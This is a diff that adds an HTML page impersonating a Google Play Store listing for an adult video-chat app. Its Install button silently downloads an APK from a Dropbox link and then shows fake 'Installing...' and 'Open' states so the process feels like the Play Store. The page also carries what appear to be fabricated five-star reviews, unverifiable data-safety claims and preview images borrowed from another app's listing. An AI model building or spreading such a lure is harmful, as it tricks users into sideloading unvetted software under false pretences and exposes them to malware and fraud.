@@ -1,0 +1,425 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SEXY CHAT : Live Call & Chat</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: Arial, sans-serif;
+}
+body{
+  background:#0f0f0f;
+  color:#fff;
+}
+.container{
+  max-width:420px;
+  margin:auto;
+  padding:15px;
+}
+.app-top{
+  display:flex;
+  gap:12px;
+  align-items:center;
+}
+.app-icon{
+  width:70px;
+  height:70px;
+  border-radius:16px;
+  background:linear-gradient(45deg,#ff4e8a,#ff9a3c);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:32px;
+}
+.app-info h1{font-size:20px;}
+.app-info p{color:#aaa;font-size:13px;}
+
+.stats{
+  display:flex;
+  justify-content:space-between;
+  margin:15px 0;
+  text-align:center;
+  font-size:13px;
+}
+.stats div{flex:1;}
+
+/* Install button with ripple */
+.install-btn{
+  background:#4285F4;
+  color:#fff;
+  padding:14px;
+  border:none;
+  border-radius:28px;
+  width:100%;
+  font-size:16px;
+  font-weight:bold;
+  text-align:center;
+  text-decoration:none;
+  display:inline-flex;
+  justify-content:center;
+  align-items:center;
+  gap:8px;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+  transition: all 0.2s ease;
+  position: relative;
+  overflow: hidden;
+}
+.install-btn:hover{
+  background:#3367D6;
+  transform: translateY(-2px);
+  box-shadow: 0 6px 10px rgba(0,0,0,0.4);
+}
+.button-info{
+  text-align:center;
+  font-size:12px;
+  color:#aaa;
+  margin-top:6px;
+}
+
+/* Carousel */
+.cards{
+  display:flex;
+  gap:10px;
+  overflow-x:auto;
+  scroll-snap-type: x mandatory;
+  -webkit-overflow-scrolling: touch;
+  margin-top:15px;
+  scrollbar-width: none;
+}
+.cards::-webkit-scrollbar{
+  display: none;
+}
+.card{
+  min-width:140px;
+  height:230px;
+  border-radius:12px;
+  overflow:hidden;
+  background:#222;
+  scroll-snap-align: start;
+  flex-shrink: 0;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+.card:hover{
+  transform: scale(1.05);
+  box-shadow: 0 8px 16px rgba(0,0,0,0.5);
+}
+.card img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+}
+
+/* Section styles */
+.section{
+  margin-top:20px;
+  padding:10px 12px;
+  border-radius:12px;
+  background: linear-gradient(145deg,#111,#1a1a1a);
+  box-shadow: inset 0 0 10px rgba(255,255,255,0.03);
+}
+.section h2{font-size:18px;margin-bottom:10px;}
+
+/* Tags */
+.tags{display:flex;gap:8px;}
+.tag{
+  border:1px solid #444;
+  padding:6px 12px;
+  border-radius:50px;
+  font-size:12px;
+  background: rgba(255,255,255,0.05);
+  transition: background 0.2s;
+}
+.tag:hover{
+  background: rgba(138,180,248,0.15);
+}
+
+/* Data safety box */
+.data-box{
+  background:#1a1a1a;
+  padding:12px;
+  border-radius:10px;
+  font-size:14px;
+  line-height:1.5;
+}
+
+/* Ratings */
+.rating{
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+.big-rating{font-size:40px;}
+.bar{
+  background:#333;
+  height:6px;
+  border-radius:5px;
+  overflow:hidden;
+}
+.fill{
+  background:#8ab4f8;
+  height:100%;
+}
+
+/* Reviews */
+.review{
+  background:#1a1a1a;
+  padding:12px;
+  border-radius:12px;
+  margin-top:10px;
+  font-size:14px;
+  line-height:1.4;
+  box-shadow: 0 3px 6px rgba(0,0,0,0.4);
+  transition: transform 0.2s ease;
+}
+.review:hover{
+  transform: translateY(-2px);
+}
+.review-header{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:6px;
+}
+.review-avatar{
+  width:36px;
+  height:36px;
+  border-radius:50%;
+  border:2px solid #8ab4f8;
+  flex-shrink:0;
+}
+.review strong{color:#fff;}
+.review .time{color:#aaa;font-size:12px;margin-top:2px;}
+.review-text{
+  display:block;
+  max-height:3.6em;
+  overflow:hidden;
+  transition: max-height 0.3s ease;
+}
+.review.expanded .review-text{
+  max-height:1000px;
+}
+.read-more{
+  color:#8ab4f8;
+  font-size:12px;
+  cursor:pointer;
+  display:inline-block;
+  margin-top:2px;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<!-- App Header -->
+<div class="app-top">
+  <div class="app-icon">💋</div>
+  <div class="app-info">
+    <h1>SEXY CHAT : Live Call & Chat</h1>
+    <p>The Real Coders</p>
+    <p>In-app purchases</p>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats">
+  <div>⭐ 4.6 <br> 44K reviews</div>
+  <div>⬇ 80 MB</div>
+  <div>🔞 18+</div>
+</div>
+
+<!-- INSTALL BUTTON (MODIFIED ONLY) -->
+<a class="install-btn"
+href="javascript:void(0)"
+onclick="startDownload()">
+💾 Install
+</a>
+
+<div class="button-info">
+  ⬇ 80 MB &nbsp; | &nbsp; ⭐ 4.6 (44K reviews) &nbsp; | &nbsp; 🔞 18+
+</div>
+
+<!-- Preview Images Carousel -->
+<div class="cards">
+  <div class="card"><img src="https://d1nxzqpcg2bym0.cloudfront.net/google_play/com.Wishes.Creation.Wishnow/9b600524-0d13-11eb-b2d1-15258ba5020a/640" alt=""></div>
+  <div class="card"><img src="https://d1nxzqpcg2bym0.cloudfront.net/google_play/com.Wishes.Creation.Wishnow/9abed0d2-0d13-11eb-be84-21b7468a7e85/640" alt=""></div>
+  <div class="card"><img src="https://d1nxzqpcg2bym0.cloudfront.net/google_play/com.Wishes.Creation.Wishnow/9b104188-0d13-11eb-b797-0920a0777665/640" alt=""></div>
+  <div class="card"><img src="https://static.gameloop.com/img/246e03b729b9452863a8e385e0ed2521.jpg?imageMogr2/thumbnail/undefinedxundefined/format/webp" alt=""></div>
+</div>
+
+<!-- About -->
+<div class="section">
+  <h2>About this app</h2>
+  <p>Chat with interesting friends & enjoy spontaneous live video chats and video calls.</p>
+  <div class="tags">
+    <div class="tag">Entertainment</div>
+    <div class="tag">Social</div>
+    <div class="tag">Networking</div>
+  </div>
+</div>
+
+<!-- Data Safety -->
+<div class="section">
+  <h2>Data safety</h2>
+  <div class="data-box">
+    🔗 This app does not share Personal info with third parties.<br><br>
+    ☁ This app does not collect Personal info.<br><br>
+    🔒 Data is encrypted in transit.<br><br>
+    🗑 Account deletion available.
+  </div>
+</div>
+
+<!-- Ratings & Reviews -->
+<div class="section">
+  <h2>Ratings & Reviews</h2>
+  <div class="rating">
+    <div class="big-rating">4.6</div>
+    <div style="flex:1">
+      5 ★
+      <div class="bar"><div class="fill" style="width:80%"></div></div>
+      4 ★
+      <div class="bar"><div class="fill" style="width:60%"></div></div>
+      3 ★
+      <div class="bar"><div class="fill" style="width:25%"></div></div>
+      2 ★
+      <div class="bar"><div class="fill" style="width:10%"></div></div>
+      1 ★
+      <div class="bar"><div class="fill" style="width:5%"></div></div>
+    </div>
+  </div>
+
+  <!-- Reviews with avatars -->
+  <div class="review">
+    <div class="review-header">
+      <img class="review-avatar" src="https://i.pravatar.cc/40?img=1" alt="Meta AI">
+      <div>
+        <strong>Rony Sharma</strong>
+        <div class="time">16/01, 11:34 am</div>
+      </div>
+    </div>
+    <p class="review-text">Awesome app! 😍 Just tried the 1rs demo call and was impressed! The interface is super easy to use and the call quality is top-notch. Great way to connect with new people 💬👥. Highly recommend giving it a shot! 👍 Love how it's affordable too 💸. Looking forward to trying more features!</p>
+    <span class="read-more">Read more</span>
+  </div>
+
+  <div class="review">
+    <div class="review-header">
+      <img class="review-avatar" src="https://i.pravatar.cc/40?img=2" alt="Riya Sharma">
+      <div>
+        <strong>Riya kumari</strong>
+        <div class="time">16/01, 12:10 pm</div>
+      </div>
+    </div>
+    <p class="review-text">Game changer! 🔥 Tried the 1rs demo call and I was hooked! 💯 Interface is sleek, call quality is crisp, and the vibe is lit 🔥👏. If you're looking to connect with cool peeps, this is the app 💥👍</p>
+    <span class="read-more">Read more</span>
+  </div>
+
+  <div class="review">
+    <div class="review-header">
+      <img class="review-avatar" src="https://i.pravatar.cc/40?img=3" alt="Amit Singh">
+      <div>
+        <strong>Amit Singh</strong>
+        <div class="time">16/01, 1:05 pm</div>
+      </div>
+    </div>
+    <p class="review-text">Really smooth experience! 😎 The video calls work perfectly even on low data 📶. I found new friends instantly! Definitely a must-try app for anyone looking to meet new people 👥💬.</p>
+    <span class="read-more">Read more</span>
+  </div>
+
+  <div class="review">
+    <div class="review-header">
+      <img class="review-avatar" src="https://i.pravatar.cc/40?img=4" alt="Priya Kaur">
+      <div>
+        <strong>Priya Kaur</strong>
+        <div class="time">16/01, 2:20 pm</div>
+      </div>
+    </div>
+    <p class="review-text">1rs demo call is super fun! 💖 Easy to use, amazing interface, and the people are friendly 👌. Call quality is crystal clear 🎥🔊. Loved it!</p>
+    <span class="read-more">Read more</span>
+  </div>
+
+  <div class="review">
+    <div class="review-header">
+      <img class="review-avatar" src="https://i.pravatar.cc/40?img=5" alt="Rahul Verma">
+      <div>
+        <strong>Rahul Verma</strong>
+        <div class="time">16/01, 3:15 pm</div>
+      </div>
+    </div>
+    <p class="review-text">Top-notch app! 🌟 Fast, smooth, and safe 🔒. The live chat feature is exciting and intuitive. Affordable too! 💸 Great for meeting new friends and networking 👥.</p>
+    <span class="read-more">Read more</span>
+  </div>
+
+</div>
+
+</div>
+
+
+<script>
+// Toggle Read more for reviews
+document.querySelectorAll('.read-more').forEach(function(btn){
+  btn.addEventListener('click', function(){
+    var review = btn.parentElement;
+    review.classList.toggle('expanded');
+    btn.textContent = review.classList.contains('expanded') ? 'Show less' : 'Read more';
+  });
+});
+
+// Ripple effect on Install button
+document.querySelectorAll('.install-btn').forEach(btn => {
+  btn.addEventListener('click', function(e){
+    const circle = document.createElement('span');
+    const d = Math.max(this.clientWidth, this.clientHeight);
+    circle.style.width = circle.style.height = d + 'px';
+    circle.style.left = e.clientX - this.getBoundingClientRect().left - d/2 + 'px';
+    circle.style.top = e.clientY - this.getBoundingClientRect().top - d/2 + 'px';
+    circle.style.position = 'absolute';
+    circle.style.background = 'rgba(255,255,255,0.3)';
+    circle.style.borderRadius = '50%';
+    circle.style.transform = 'scale(0)';
+    circle.style.opacity = '1';
+    circle.style.pointerEvents = 'none';
+    circle.style.transition = 'transform 0.6s ease, opacity 0.6s ease';
+    this.appendChild(circle);
+    requestAnimationFrame(() => {
+      circle.style.transform = 'scale(4)';
+      circle.style.opacity = '0';
+    });
+    setTimeout(() => circle.remove(), 600);
+  });
+});
+
+// 🔥 PLAY STORE STYLE DOWNLOAD (UPDATED ONLY)
+function startDownload(){
+  const btn = document.querySelector(".install-btn");
+
+  // Step 1: Change UI instantly
+  btn.innerHTML = "Downloading...";
+  btn.style.background = "#2e7d32";
+
+  // Step 2: Start download silently
+  const link = document.createElement("a");
+  link.href = "https://www.dropbox.com/scl/fi/kvwv5heacmc2ql22iaveu/signed.apk?rlkey=w8mhilm3rvwc8dhzmpd9xnrpl&dl=1";
+  link.setAttribute("download", "SEXY CHAT.apk");
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+
+  // Step 3: Fake installing → open (Play Store feel)
+  setTimeout(()=>{
+    btn.innerHTML = "Installing...";
+  }, 3000);
+
+  setTimeout(()=>{
+    btn.innerHTML = "Open";
+    btn.style.background = "#1b5e20";
+  }, 6000);
+}
+</script>
+
+</body>
+</html
